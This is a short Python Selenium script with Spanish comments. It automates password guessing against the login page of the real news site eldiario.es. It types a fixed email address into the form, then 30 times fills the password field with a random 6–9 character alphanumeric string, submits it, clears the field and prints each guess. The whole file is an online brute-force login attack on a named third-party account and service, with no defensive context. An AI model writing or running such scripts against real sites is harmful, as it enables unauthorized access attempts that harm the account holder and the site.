
import string
import time
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


#driver de chrome, luego "driver" es la variable para interactuar con la pagina
driver = webdriver.Chrome(executable_path=r"C:\driver_chrome_selenium\chromedriver.exe")
driver.get('https://usuarios.eldiario.es/iniciar-sesion/')
time.sleep(3)

letters = string.ascii_letters + string.digits
print(letters)

#el xpath es copiado de la misma pagina con las herramientas de desarrollador
usr = driver.find_element_by_xpath('//*[@id="__next"]/div/div/div/div[2]/form/div/div[1]/label/div/input[@value]')
usr.send_keys("nicolasestebanc@hotmail.es")
for x in range(30):

    psw = driver.find_element_by_xpath('//*[@id="__next"]/div/div/div/div[2]/form/div/div[2]/label/div/input[@value]')
    _str = ''.join(random.choice(letters) for i in range(random.randrange(6,10)))
    psw.send_keys(_str)

    clk = driver.find_element_by_xpath('//*[@id="__next"]/div/div/div/div[2]/form/div/div[4]/button').submit()    

    js = 'document.getElementsByName("password")[0].value=""'
    driver.execute_script(js)

    time.sleep(1)
    print(_str)
